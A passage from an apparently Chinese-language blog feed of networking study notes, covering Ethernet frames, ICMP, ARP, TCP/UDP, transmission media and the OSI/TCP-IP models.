SFD)附加到帧头然后进行传输。前导码的作用是使接收设备进行同步并做好接收数据帧的准备</p><p>前导码是包括了7个字节的二进制“1”、“0”交替的代码，即1010…10共56位。帧首定界符是长度为1个字节的10101011二进制序列，它的作用是使接收端对帧的第一位进行定位</p></li><li><p>本例中，主机A发送数据帧到共享以太网，此网络中的所有网络设备都会收到该帧设备收到帧之后，首先会进行FCS校验。如果FCS校验未能通过，则帧被立即丢弃。对于通过了FCS校验的帧，设备会检查帧中的目的MAC地址</p><p>如果帧中的目的MAC地址与自己的MAC地址不同，设备将丢弃帧，如果相同，则会继续处理。处理过程中，帧头帧尾会被剥去（也就是解封装），剩下的数据报文会被根据帧头中的类型字段的值来送到网络层中的对应协议模块去处理</p></li><li><p>RTA收到此数据报文后，网络层会对该报文进行处理</p><p>RTA首先根据IP头部信息中的校验和字段，检查IP数据报文头部的完整性，然后根据目的IP地址查看路由表，确定是否能够将数据包转发到目的端。RTA还必须对TTL的值进行处理。另外，报文大小不能超过MTU值。如果报文大小超过MTU值，则报文将被分片</p><p>网络层处理完成后，报文将被送到数据链路层重新进行封装，成为一个新的数据帧，该帧的头部会封装新的源MAC地址和目的MAC地址。如果当前网络设备不知道下一跳的MAC地址，将会使用ARP来获得</p></li><li><p>该示例中，服务器A处于一个共享以太网中，两台服务器都会收到RTB发送的数据帧。该帧的目的MAC地址与服务器B的接口MAC地址不匹配，所以会被服务器B丢弃</p><p>服务器A成功收到该帧，并通过FCS校验。服务器A将利用帧中的类型字段来识别在网络层处理该数据的协议。该示例中，服务器A会将解封装后的此数据交给网络层的IP协议来进行处理</p></li><li><p>服务器A通过IP协议来处理该报文，首先会通过校验和字段来验证报文头的完整性，然后检查IP报文头中的目的IP地址是否与自己当前的IP地址匹配</p><p>如果在源与目的之间的数据传输期间数据发生了报文分片，则报文会被目的端重新组合。标识字段用于标识属于同一数据源的分片报文，偏移量表示该分片在原分组中的相对位置。标志字段目前只有两位有意义，标志字段最低位为1，表示后面还有分片，为0表示这已经是最后一个数据片;中间一位为1表示不能分片，为0表示允许分片。所有的分片报文必须被目的端全部接收到后才会进行重新组合</p><p>协议字段表示此数据包携带的上层数据是哪种协议的数据。需要注意的是，下一个报头并非总是传输层报头。例如，ICMP报文也是使用IP协议封装，协议字段值为0x01</p></li><li><p>当IP报文头被处理完并剥离后，数据段会被发送到传输层进行处理。在此示例中，传输层协议使用的是TCP，且发送端和接收端已经通过三次握手建立了连接</p><p>传输层收到该数据段后，TCP协议会查看并处理该数据段头部信息，其中目的端口号为80，用于表示处理该数据的应用层协议为HTTP协议。TCP处理完头部信息后会将此数据段头部进行剥离，然后将剩下的应用数据发送到HTTP协议进行处理</p></li></ol></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>TCP/IP基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ICMP协议,ARP协议,传输层协议</title>
    <link href="/2021/07/16/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/TCP,IP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ICMP%E5%8D%8F%E8%AE%AE,ARP%E5%8D%8F%E8%AE%AE,%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/07/16/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/TCP,IP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ICMP%E5%8D%8F%E8%AE%AE,ARP%E5%8D%8F%E8%AE%AE,%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="ICMP协议-ARP协议-传输层协议"><a href="#ICMP协议-ARP协议-传输层协议" class="headerlink" title="ICMP协议,ARP协议,传输层协议"></a>ICMP协议,ARP协议,传输层协议</h1><p>具体内容如题</p><h2 id="1-ICMP协议"><a href="#1-ICMP协议" class="headerlink" title="1. ICMP协议"></a>1. ICMP协议</h2><p>Internet控制消息协议ICMP ( Internet Control Message Protocol )是网络层的一个重要协议</p><p>ICMP协议用来在网络设备间传递各种差错和控制信息，并对于收集各种网络信息、诊断和排除各种网络故障等方面起着至关重要的作用。</p><p><strong>ICMP</strong></p><ul><li><p>ICMP是TCP/IP协议簇的核心协议之一，它用于在IP网络设备之间发送控制报文，传递差错、控制、查询等信息</p></li><li><p><img src="https://pic.imgdb.cn/item/60f0f5905132923bf84fcf98.png"></p><p>ICMP Redirect重定向消息用于支持路由功能。如图所示，主机A希望发送报文到服务器A，于是根据配置的默认网关地址向网关RTB发送报文。网关RTB收到报文后，检查报文信息，发现报文应该转发到与源主机在同一网段的另一个网关设备RTA，因为此转发路径是更优的路径，所以RTB会向主机发送一个Redirect消息，通知主机直接向另一个网关RTA发送该报文。主机收到Redirect消息后，会向RTA发送报文，然后RTA会将该报文再转发给服务器A</p></li><li><p>ICMP Echo消息常用于诊断源和目的地之间的网络连通性，同时还可以提供其他信息，如报文往返时间等</p></li><li><p>ICMP定义了各种错误消息，用于诊断网络连接性问题;根据这些错误消息，源设备可以判断出数据传输失败的原因。比如，如果网络中发生了环路，导致报文在网络中循环，且最终TTL超时，这种情况下网络设备会发送TTL超时消息给发送端设备。又比如如果目的地不可达，则中间的网络设备会发送目的不可达消息给发送端设备。目的不可达的情况有多种，如果是网络设备无法找到目的网络，则发送目的网络不可达消息；如果网络设备无法找到目的网络中的目的主机，则发送目的主机不可达消息</p></li><li><p>ICMP数据包格式</p><p>ICMP消息封装在IP报文中。ICMP消息的格式取决于Type和Code字段，其中Type字段为消息类型，Code字段包含该消息类型的具体参数</p><p>后面的校验和字段用于检查消息是否完整。消息中包含32比特的可变参数，这个字段一般不使用，通常设置为0</p><p>在ICMP Redirect消息中，这个字段用来指定网关IP地址，主机根据这个地址将报文重定向到指定网关</p><p>在Echo请求消息中，这个字段包含标识符和序号，源端根据这两个参数将收到的回复消息与本端发送的Echo请求消息进行关联。尤其是当源端向目的端发送了多个Echo请求消息时，需要根据标识符和序号将Echo请求和回复消息进行——对应</p></li><li><p>ICMP信息类型和编码类型</p><table><thead><tr><th>类型</th><th>编码</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>Echo Reply</td></tr><tr><td>3</td><td>0</td><td>网络不可达</td></tr><tr><td>3</td><td>1</td><td>主机不可达</td></tr><tr><td>3</td><td>2</td><td>协议不可达</td></tr><tr><td>3</td><td>3</td><td>端口不可达</td></tr><tr><td>5</td><td>0</td><td>重定向</td></tr><tr><td>8</td><td>0</td><td>Echo Request</td></tr></tbody></table></li><li><p>Ping</p><p>ICMP的典型应用是Ping</p><p>Ping命令的输出信息中包括目的地址、ICMP报文长度、序号、TTL值以及往返时间。序号是包含在Echo回复消息(Type=0 )中的可变参数字段，TTL和往返时间包含在消息的IP头中</p></li><li><p>Tracert</p><p>ICMP的另一个典型应用是Tracert</p><p>Tracert基于报文头中的TTL值来逐跳跟踪报文的转发路径。为了跟踪到达某特定目的地址的路径，源端首先将报文的TTL值设置为1。该报文到达第一个节点后，TTL超时，于是该节点向源端发送TTL超时消息，消息中携带时间戳。然后源端将报文的TTL值设置为2，报文到达第二个节点后超时，该节点同样返回TTL超时消息，以此类推，直到报文到达目的地。这样，源端根据返回的报文中的信息可以跟踪到报文经过的每一个节点，并根据时间戳信息计算往返时间。Tracert是检测网络丢包及时延的有效手段，同时可以帮助管理员发现网络中的路由环路<br>Tracert常用的配置参数说明如下∶</p><ul><li>-a source-ip-address指定tracert报文的源地址</li><li>-f first-ttl指定初始TTL。缺省值是1</li><li>-m max-ttl指定最大TTL。缺省值是30</li><li>-name使能显示每一跳的主机名</li><li>-p port指定目的主机的UDP端口号</li></ul></li></ul><h2 id="2-ARP协议"><a href="#2-ARP协议" class="headerlink" title="2. ARP协议"></a>2. ARP协议</h2><p>一个网络设备要发送数据给另一个网络设备时，必须要知道对方的IP地址。但是，仅有IP地址是不够的，因为IP数据报文必须封装成帧才能通过数据链路进行发送，而数据帧必须要包含目的MAC地址，因此发送端还必须获取到目的MAC地址</p><p>每一个网络设备在数据封装前都需要获取下一跳的MAC地址。IP地址由网络层来提供，MAC地址通过ARP协议来获取。ARP协议是TCP/IP协议簇中的重要组成部分，它能够通过目的IP地址获取目标设备的MAC地址，从而实现数据链路层的可达性</p><p>ARP数据包格式</p><p><img src="https://pic.imgdb.cn/item/60f0fd9d5132923bf87db700.png" alt="ARP格式"></p><p>ARP包含以下字段</p><ol><li>Hardware Type表示硬件地址类型，一般为以太网</li><li>Protocol Type表示三层协议地址类型，一般为IP</li><li>Hardware Length和Protocol Length为MAC地址和IP地址的长度，单位是字节</li><li>Operation Code指定了ARP报文的类型，包括ARP Request和ARP Reply </li><li>Source Hardware Address指的是发送ARP报文的设备MAC地址</li><li>Source Protocol Address指的是发送ARP报文的设备IP地址</li><li>Destination Hardware Address指的是接收者MAC地址，在ARP Request报文中，该字段值为0</li><li>Destination Protocol Address指的是接收者的IP地址</li></ol><p><strong>ARP工作流程</strong></p><p>首先主机发送信息，需要获取目标主机的MAC地址</p><ol><li><p>ARP缓存</p><p>网络设备一般都有一个ARP缓存(ARP Cache )，ARP缓存用来存放IP地址和MAC地址的关联信息。在发送数据前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的MAC地址，则直接采用该MAC地址来封装帧，然后将帧发送出去</p><p>如果缓存表中不存在相应信息，则通过发送ARP Request报文来获得它。学习到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期内，设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进行ARP查询。过了这段有效期，ARP表项会被自动删除。</p><p>如果目标设备位于其他网络，则源设备会在ARP缓存表中查找网关的MAC地址，然后将数据发送给网关，网关再把数据转发给目的设备</p></li><li><p>ARP请求</p><p>如果主机的ARP缓存表中不存在目标主机的MAC地址，则会发送ARP Request来获取目的MAC地址</p><p>ARP Request报文封装在以太帧里。帧头中的源MAC地址为发送端主机的MAC地址。此时，由于主机不知道目标主机的MAC地址，所以目的MAC地址为广播地址FF-FF-FF-FF-FF-FF。ARP Request报文中包含源P地址、目的IP地址、源MAC地址、目的MAC地址，其中目的MAC地址的值为0。ARP Request报文会在整个网络上传播，该网络中所有主机包括网关都会接收到此ARP Request报文</p><p>网关将会阻止该报文发送到其他网络上</p></li><li><p>ARP响应</p><p>所有的主机接收到该ARP Request报文后，都会检查它的目的协议地址字段与自身的IP地址是否匹配。如果不匹配，则该主机将不会响应该ARP Request报文。如果匹配，则该主机会将ARP报文中的源MAC地址和源IP地址信息记录到自己的ARP缓存表中，然后通过ARP Reply报文进行响应</p><p>回应ARP Reply报文。ARP Reply报文中的源协议地址是主机C自己的IP地址，目标协议地址是源主机的IP地址，目的MAC地址是源主机的MAC地址，源MAC地址是自己的MAC地址，同时Operation Code被设置为Reply。ARP Reply报文通过单播传送</p></li><li><p>ARP缓存</p><p>主机收到ARP Reply以后，会检查ARP报文中目的MAC地址是否与自己的MAC匹配。如果匹配，ARP报文中的源MAC地址和源IP地址会被记录到主机的ARP缓存表中</p></li></ol><p><strong>ARP代理</strong></p><ol><li>当主机A需要与主机B通信时，目的IP地址与本机的IP地址在同一个网段，所以A将会以广播形式发送ARP Request报文，请求主机B的MAC地址。但是，广播报文无法被路由器转发，所以主机B无法收到主机A的ARP请求报文，当然也就无法应答</li><li>在路由器上启用代理ARP功能，就可以解决这个问题。启用代理ARP后，路由器收到这样的请求，会查找路由表，如果存在主机B的路由表项，路由器将会使用自己的G0/0/0接口的MAC地址来回应该ARP Request。主机A收到ARP Reply后，将以路由器的G0/0/0接口MAC地址作为目的MAC地址进行数据转发</li></ol><p><strong>免费ARP</strong></p><ol><li>主机被分配了IP地址或者IP地址发生变更后，必须立刻检测其所分配的IP地址在网络上是否是唯一的，以避免地址冲突。主机通过发送ARP Request报文来进行地址冲突检测</li><li>主机A将ARPRequest广播报文中的目的IP地址字段设置为自己的IP地址，且该网络中所有主机包括网关都会接收到此报文。当目的IP地址已经被某一个主机或网关使用时，该主机或网关就会回应ARP Reply报文。通过这种方式，主机A就能探测到IP地址冲突了</li></ol><h2 id="3-传输层协议"><a href="#3-传输层协议" class="headerlink" title="3. 传输层协议"></a>3. 传输层协议</h2><p>传输层最为常见的两个协议分别是传输控制协议TCP（Transmission Control Protocol）和用户数据包协议UDP( User Datagram Protocol )</p><ol><li><p>TCP</p><ul><li><p>位于TCP/IP模型的传输层，它是一种面向连接的端到端协议。TCP作为传输控制协议，可以为主机提供可靠的数据传输。</p></li><li><p>TCP允许一个主机同时运行多个应用进程。每台主机可以拥有多个应用端口，每对端口号、源和目标IP地址的组合唯一地标识了一个会话。端口分为知名端口和动态端口。有些网络服务会使用固定的端口，这类端口称为知名端口，端口号范围为0-1023。如FTP、HTTP、Telnet、SNMP服务均使用知名端口。动态端口号范围从1024到65535，这些端口号一般不固定分配给某个服务，也就是说许多服务都可以使用这些端口。只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用</p></li><li><p>TCP头部</p><p><img src="https://pic.imgdb.cn/item/60f10ed15132923bf8e0838d.png"></p><ol><li>TCP通常使用IP作为网络层协议，这时TCP数据段被封装在IP数据包内</li><li>TCP数据段由TCP Header(头部)和TCP Data（数据）组成。TCP最多可以有60个字节的头部，如果没有Options字段，正常的长度是20字节</li><li>TCP Header是由如上图标识的一些字段组成，这里列出几个常用字段。16位源端口号︰源主机的应用程序使用的端口号</li><li>16位目的端口号∶目的主机的应用程序使用的端口号。每个TCP头部都包含源和目的端的端口号，这两个值加上IP头部中的源IP地址和目的IP地址可以唯一确定一个TCP连接。</li><li>32位序列号∶用于标识从发送端发出的不同的TCP数据段的序号。数据段在网络中传输时，它们的顺序可能会发生变化;接收端依据此序列号，便可按照正确的顺序重组数据</li><li>32位确认序列号∶用于标识接收端确认收到的数据段。确认序列号为成功收到的数据序列号加1</li><li>4位头部长度∶表示头部占32bit字的数目，它能表达的TCP头部最大长度为60字节</li><li>16位窗口大小:表示接收端期望通过单次确认而收到的数据的大小。由于该字段为16位，所以窗口大小的最大值为65535字节，该机制通常用来进行流量控制</li><li>16位校验和︰校验整个TCP报文段，包括TCP头部和TCP数据。该值由发送端计算和记录并由接收端进行验证</li></ol></li><li><p>TCP建立连接</p><ol><li><p>TCP是一种可靠的，面向连接的全双工传输层协议</p></li><li><p>TCP连接的建立是一个三次握手的过程。如图所示︰</p><p><img src="https://pic.imgdb.cn/item/60f10f815132923bf8e56704.png"></p><ol><li>主机A（通常也称为客户端)发送一个标识了SYN的数据段，表示期望与服务器A建立连接，此数据段的序列号( seq )为a</li><li>服务器A回复标识了SYN+ACK的数据段，此数据段的序列号( seq )为b，确认序列号为主机A的序列号加1( a+1 )，以此作为对主机A的SYN报文的确认</li><li>主机A发送一个标识了ACK的数据段，此数据段的序列号( seq)为a+1，确认序列号为服务器A的序列号加1( b+1)，以此作为对服务器A的SYN报文的确认</li></ol></li></ol></li><li><p>TCP传输过程</p><p>TCP的可靠传输还体现在TCP使用了确认技术来确保目的设备收到了从源设备发来的数据，并且是准确无误的。</p><ul><li><img src="https://pic.imgdb.cn/item/60f112e45132923bf8fec1b1.png"></li></ul><ol><li>目的设备接收到源设备发送的数据段时，会向源端发送确认报文，源设备收到确认报文后，继续发送数据段，如此重复</li><li>如图所示，主机A向服务器A发送TCP数据段，为描述方便假定每个数据段的长度都是500个字节。当服务器A成功收到序列号是M+1499的字节以及之前的所有字节时，会以序列号M+1499+1=M+1500进行确认。另外，由于数据段N+3传输失败，所以服务器A未能收到序列号为M+1500的字节，因此服务器A还会再次以序列号M+1500进行确认</li></ol></li><li><p>TCP流量控制</p><p><img src="https://pic.imgdb.cn/item/60f113a65132923bf8046e6a.png"></p><ul><li>TCP滑动窗口技术通过动态改变窗口大小来实现对端到端设备之间的数据传输进行流量控制</li><li>如图所示，主机A和服务器A之间通过滑动窗口来实现流量控制。为方便理解，此例中只考虑主机A发送数据给服务器A时，服务器A通过滑动窗口进行流量控制</li><li>主机A向服务器发送4个长度为1024字节的数据段，其中主机的窗口大小为4096个字节。服务器A收到第3个数据段后，缓存区满，第4个数据段被丢弃。服务器以ACK 3073响应，窗口大小调整为3072，表明服务器的缓冲区只能处理3072个字节的数据段。于是主机A改变其发送速率，发送窗口大小为3072的数据段</li></ul></li><li><p>TCP关闭连接</p><ul><li><p>TCP支持全双工模式传输数据，同一时刻两个方向都可以进行数据的传输。在传输数据之前，TCP通过三次握手建立的实际上是两个方向的连接，因此在传输完毕后，两个方向的连接必须都关闭。</p></li><li><p>TCP连接的建立是一个三次握手的过程，而TCP连接的终止则要经过四次握手</p></li><li><p>如图所示︰</p><p><img src="https://pic.imgdb.cn/item/60f1143b5132923bf808e71f.png"></p><ol><li>主机A想终止连接，于是发送一个标识了FIN，ACK的数据段，序列号为a，确认序列号为b</li><li>服务器A回应一个标识了ACK的数据段，序列号为b，确认序号为a+1，作为对主机A的FIN报文的确认</li><li>服务器A想终止连接，于是向主机A发送一个标识了FIN，ACK的数据段，序列号为b，确认序列号为a+1</li><li>主机A回应一个标识了ACK的数据段，序列号为a+1，确认序号为b+1，作为对服务器A的FIN报文的确认</li><li>以上四次交互便完成了两个方向连接的关闭。</li></ol></li></ul></li></ul></li><li><p>UDP</p><p>当应用程序对传输的可靠性要求不高，但是对传输速度和延迟要求较高时，可以用UDP协议来替代TCP协议在传输层控制数据的转发。</p><p>UDP将数据从源端发送到目的端时，无需事先建立连接。</p><p>UDP采用了简单、易操作的机制在应用程序间传输数据，没有使用TCP中的确认技术或滑动窗口机制，因此UDP<strong>不能保证数据传输的可靠性</strong>，也无法避免接收到重复数据的情况。</p><ul><li><p>UDP头部</p><p><img src="https://pic.imgdb.cn/item/60f119bd5132923bf834293b.png"></p><ul><li>UDP报文分为UDP报文头和UDP数据区域两部分。报头由源端口、目的端口、报文长度以及校验和组成。UDP适合于实时数据传输，如语音和视频通信。相比于TCP，UDP的传输效率更高、开销更小，但是无法保障数据传输的可靠性。UDP头部的标识如下︰<ol><li>16位源端口号︰源主机的应用程序使用的端口号</li><li>16位目的端口号∶目的主机的应用程序使用的端口号</li><li>16位UDP长度︰是指UDP头部和UDP数据的字节长度。因为UDP头部长度为8字节，所以该字段的最小值为8</li><li>16位UDP校验和︰该字段提供了与TCP校验字段同样的功能;该字段是可选的</li></ol></li></ul></li><li><p>UDP传输过程</p><ul><li>主机发送数据包时，这些数据包是以有序的方式发送到网络中的，每个数据包独立地在网络中被发送，所以不同的数据包可能会通过不同的网络路径到达目标主机</li><li>这样的情况下，先发送的数据包不一定先到达目标主机。因为UDP数据包没有序号，目标主机将无法通过UDP协议将数据包按照原来的顺序重新组合，所以此时需要应用程序提供报文的到达确认、排序和流量控制等功能</li><li>通常情况下，UDP采用实时传输机制和时间戳来传输语音和视频数据。</li></ul></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>TCP/IP基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>传输介质,以太网帧,IP编码</title>
    <link href="/2021/07/15/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/TCP,IP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E4%BC%A0%E8%BE%93%E4%BB%8B%E8%B4%A8,%E4%BB%A5%E5%A4%AA%E7%BD%91%E5%B8%A7,IP%E7%BC%96%E7%A0%81/"/>
    <url>/2021/07/15/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/TCP,IP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E4%BC%A0%E8%BE%93%E4%BB%8B%E8%B4%A8,%E4%BB%A5%E5%A4%AA%E7%BD%91%E5%B8%A7,IP%E7%BC%96%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="传输介质-以太网帧-IP编码"><a href="#传输介质-以太网帧-IP编码" class="headerlink" title="传输介质,以太网帧,IP编码"></a>传输介质,以太网帧,IP编码</h1><p>具体内容如题</p><h2 id="1-传输介质简介"><a href="#1-传输介质简介" class="headerlink" title="1.传输介质简介"></a>1.传输介质简介</h2><p>简单网络：两个终端，用一条能承载数据传输的物理介质(也称传输介质)连接起来。</p><p>关于网络：</p><ul><li>终端相互传递信息和资源共享的需求是网络产生的主要原因</li><li>终端可以产生、发送和接受数据，网络是终端建立通信的媒介，终端通过网络建立连接。其中用来传输数据的载体成为介质，网络可以使用各种介质进行数据传输，包括物理线缆，无线电波等</li><li>网络就是通过介质把终端互连而成的一个规模大、功能强的系统，从而使得众多的终端可以方便地互相传递信息，共享信息资源</li></ul><p>下面是对于各种介质的简单介绍</p><ol><li><p>同轴电缆</p><ul><li>同轴电缆是早期使用的传输介质，标准有两种：10BASEE2和10BASE5，均支持10Mbps的传输速率，最长传输距离分别为185m和500m。一般情况下，10BASE2使用BNC接头，10BASE5使用N型接头</li><li>10BASE5直径为9.5mm称为粗缆，10BASE2直径为5mm称为细缆</li><li>如今，10Mbps的传输速率已经不能满足网络需求了，所以逐渐被淘汰</li></ul></li><li><p>双绞线</p><p>双绞线相较于同轴电缆有更低的制造和部署成本，因此在企业中被广泛应用。</p><p>双绞线按照线序可以分为直通线(两头都是568A)，交叉线(一头为568A一头为568B)和全反线(线序相反)，其中直通线连接不同设备，交叉线连接系统设备，全反线一般链接console口</p><p>双绞线分为屏蔽双绞线和非屏蔽双绞线。</p><ul><li>屏蔽双绞线在双绞线与外层绝缘封套之间有一个金属屏蔽层，可以屏蔽电磁干扰</li></ul><p>双绞线类型较多，不同类型的双绞线支持的传输速率也不同。如：</p><ul><li>3类双绞线支持10Mbps传输速率</li><li>5类双绞线支持100Mbps传输速率</li><li>超5类双绞线以及更高级别的双绞线支持千兆以太网。</li></ul><p>双绞线使用RJ-45接头连接网络设备，其中RJ-45接头中的针脚必须按照一定的线序排列。</p><p>如下是部分双绞线类别：</p><table><thead><tr><th>以太网标准</th><th>线缆类别</th><th>最长有效传输距离</th></tr></thead><tbody><tr><td>10BASE-T</td><td>两对3/4/5类双绞线</td><td>100m</td></tr><tr><td>10BASE-TX</td><td>两对5类双绞线</td><td>100m</td></tr><tr><td>1000BASE-T</td><td>四对5e类双绞线</td><td>100m</td></tr></tbody></table></li><li><p>光纤</p><p>之前介绍的双绞线和同轴电缆均是使用电信号进行传输，而光纤传输数据使用的是光信号。</p><p>光纤支持的传输速率包括10Mbps、100Mbps、1Gbps、10Gbps甚至更高。</p><p>根据光纤传输的光信号模式不同，光纤可分为单模光纤和多模光纤。</p><ul><li>单模光纤只传输一种模式的光，不存在模间色散，适用于长距离传输。</li><li>多模光纤允许不同模式的光在一根光纤上传输，由于模间色散较大导致想好脉冲展宽严重，隐藏适用于局域网短距离传输</li></ul><p>光纤连接器种类较多，常用的连接器包括ST、FC、SC、LC</p><p>如下是部分光纤类别：</p><table><thead><tr><th>以太网标准</th><th>线缆类别</th><th>最长有效传输距离</th></tr></thead><tbody><tr><td>10BASE-F</td><td>单模/多模光纤</td><td>2000m</td></tr><tr><td>100BASE-FX</td><td>单模/多模光纤</td><td>2000m</td></tr><tr><td>1000BASE-LX</td><td>单模/多模光纤</td><td>316m</td></tr><tr><td>1000BASE-SX</td><td>多模光纤</td><td>316m</td></tr></tbody></table></li><li><p>串口电缆</p><p>网络通信中常用各种串口电缆。常用的串口电缆标准为RS-232也是推荐的标准。但是RS-232的传输速率有限且传输距离仅6米。现在RS-232逐渐被FireWire、USB等标准取代。新产品和设备普遍使用USB标准</p></li></ol><p><strong>冲突域</strong></p><p>以太网结构如图</p><p><img src="https://pic.imgdb.cn/item/60f048005132923bf8dc3437.png"></p><ul><li>图中是一个10BASE5以太网，主机都是使用同一根同轴电缆进行通讯，这里的同轴电缆被称为共享介质，相应的网络也被成为共享介质网络。共享网络中，由于不同介质同时发送数据，可能会产生信号冲突。解决该问题的方法一般是采用载波监听多路访问/冲突检测技术(Carrier Sense Multiple Access/Collision Detection)</li><li>CSMA/CD的基本工作过程如下∶<ol><li>终端设备不停检测共享线路的状态。如果线路空闲，则可以发送数据﹔如果线路不空闲，则等待一段时间后继续检测（延时时间由退避算法决定)</li><li>如果有另外一个设备同时发送数据，两个设备发送的数据发送冲突</li><li>终端设备检测到冲突之后，马上停止发送自己的数据，并发送特殊阻塞信息，强化冲突信号，使线路上其它站点能够尽早检测到冲突</li><li>终端设备检测到冲突后，等待一段时间之后再进行数据发送(延时时间由退避算法决定)</li><li>CSMA/CD的工作原理可简单总结为︰先听后发，边发边听，冲突停发，随机延迟后重发。</li></ol></li></ul><p><strong>双工模式</strong></p><p>双工模式分为以下几种：</p><ol><li>半双工∶在半双工模式( half-duplex mode)下，通信双方都能发送和接收数据，但不能同时进行。当一台设备发送时，另一台只能接收，反之亦然。对讲机是半双工的典型例子。</li><li>全双工︰在全双工模式( full-duplex mode )下，通信双方都能同时接收和发送数据。电话网络是典型的全双工例子。</li></ol><p>以太网上的通信模式也包括半双工和全双工两种︰</p><ol><li><p>半双工模式下，共享物理介质的通信双方必须采用CSMA/CD机制来避免冲突。例，10BASE5以太网的通信模式就必须是半双工模式。</p></li><li><p>全双工模式下，通信双方可以同时实现双向通信，这种模式不会产生冲突，因此不需要使用CSMA/CD机制。例如，10BASE-T以太网的通信模式就可以是全双工模式。</p></li></ol><p>同一物理链路上相连的两台设备的双工模式必须保持一致。</p><h2 id="2-以太网帧结构"><a href="#2-以太网帧结构" class="headerlink" title="2. 以太网帧结构"></a>2. 以太网帧结构</h2><p><strong>网络通信协议</strong></p><p>  不同的协议栈用于定义和管理不同网络的数据转发规则</p><p><strong>OSI模型</strong></p><p>OSI模型的优点：简化了相关的网络操作；提供了不同厂商之间的兼容性；促进了标准化工作；结构上进行了分层；易于学习和操作</p><ol><li>物理层∶在设备之间传输比特流，规定了电平、速度和电缆针脚</li><li>数据链路层∶将比特组合成字节，再将字节组合成帧，使用链路层地址（以太网使用MAC地址）来访问介质，并进行差错检测</li><li>网络层∶提供逻辑地址，供路由器确定路径</li><li>传输层︰提供面向连接或非面向连接的数据传递以及进行重传前的差错检测</li><li>会话层︰负责建立、管理和终止表示层实体之间的通信会话。该层的通信由不同设备中的应用程序之间的服务请求和响应组成</li><li>表示层∶提供各种用于应用层数据的编码和转换功能，确保一个系统的应用层发送的数据能被另一个系统的应用层识别</li><li>应用层∶OSI参考模型中最靠近用户的一层，为应用程序提供网络服务</li></ol><p><strong>TCP/IP模型</strong></p><ol><li>TCP/IP模型同样采用了分层结构，层与层相对独立但是相互之间也具备非常密切的协作关系</li><li>TCP/IP模型将网络分为四层。TCP/IP模型不关注底层物理介质，主要关注终端之间的逻辑数据流转发。TCP/IP模型的核心是网络层和传输层，网络层解决网络之间的逻辑转发问题，传输层保证源端到目的端之间的可靠传输。最上层的应用层通过各种协议向终端用户提供业务应用</li></ol><p><strong>数据封装</strong></p><p>应用数据需要经过TCP/IP每一层处理之后才能通过网络传输到目的端，每一层上都使用该层的协议数据单元PDU( Protocol Data Unit )彼此交换信息。</p><p>不同层的PDU中包含有不同的信息，因此PDU在不同层被赋予了不同的名称。</p><p>如上层数据在传输层添加TCP报头后得到的PDU被称为Segment（数据段）；数据段被传递给网络层，网络层添加IP报头得到的PDU被称为Packet(数据包）；数据包被传递到数据链路层，封装数据链路层报头得到的PDU被称为Frame(数据帧）；最后，帧被转换为比特，通过网络介质传输。这种协议栈逐层向下传递数据，并添加报头和报尾的过程称为封装</p><p><strong>终端之间的通信</strong></p><p>数据包在以太网物理介质上传播之前必须封装头部和尾部信息，封装后的数据包称为数据帧，数据帧中封装的信息决定了数据如何传输。以太网上传输的数据帧有两种格式，选择哪种格式由TCP/IP协议簇中的网络层决定</p><p> <strong>帧格式</strong></p><p><img src="https://pic.imgdb.cn/item/60f0e5c55132923bf8f38fee.png"></p><ol><li><p>以太网上使用两种标准帧格式</p><p>第一种是EthernetⅡ帧格式</p><p>第二种是1983年提出的IEEE 802.3格式。这两种格式的主要区别在于Ethernet II格式中包含一个Type字段，标识以太帧处理完成之后将被发送到哪个上层协议进行处理，IEEE802.3格式中，同样的位置是长度字段</p></li><li><p>不同的Type字段值可以用来区别这两种帧的类型，当Type字段值小于等于1500（或者十六进制的0x05DC)时，帧使用的是IEEE 802.3格式。当Type字段值大于等于1536（或者十六进制的0x0600 )时，帧使用的是Ethernet II格式。以太网中大多数的数据帧使用的是Ethernet II格式</p></li><li><p>以太帧中还包括源和目的MAC地址，分别代表发送者的MAC和接收者的MAC，此外还有帧校验序列字段，用于检验传输过程中帧的完整性</p></li></ol><p><strong>EthernetⅡ帧格式</strong></p><p>Ethernet_Ⅱ的帧中各字段说明如下∶</p><ol><li>DMAC ( Destination MAC)是目的MAC地址。DMAC字段长度为6个字节，标识帧的接收者</li><li>SMAC ( Source MAC)是源MAC地址。SMAC字段长度为6个字节，标识帧的发送者</li><li>类型字段( Type )用于标识数据字段中包含的高层协议，该字段长度为2个字节。类型字段取值为Ox0800的帧代表P协议帧;类型字段取值为0x0806的帧代表ARP协议帧</li><li>数据字段( Data )是网络层数据，最小长度必须为46字节以保证帧长至少为64字节，数据字段的最大长度为1500字节</li><li>循环冗余校验字段(FCS)提供了一种错误检测机制。该字段长度为4个字节</li></ol><p><strong>IEEE 802.3格式</strong></p><p>IEEE802.3帧格式类似于Ethernet_Ⅱ帧，只是Ethernet_Ⅱ帧的Type域被802.3帧的Length域取代，并且占用了Data字段的8个字节作为LLC和SNAP字段</p><ol><li>Length字段定义了Data字段包含的字节数</li><li>逻辑链路控制LLC ( Logical Link Control 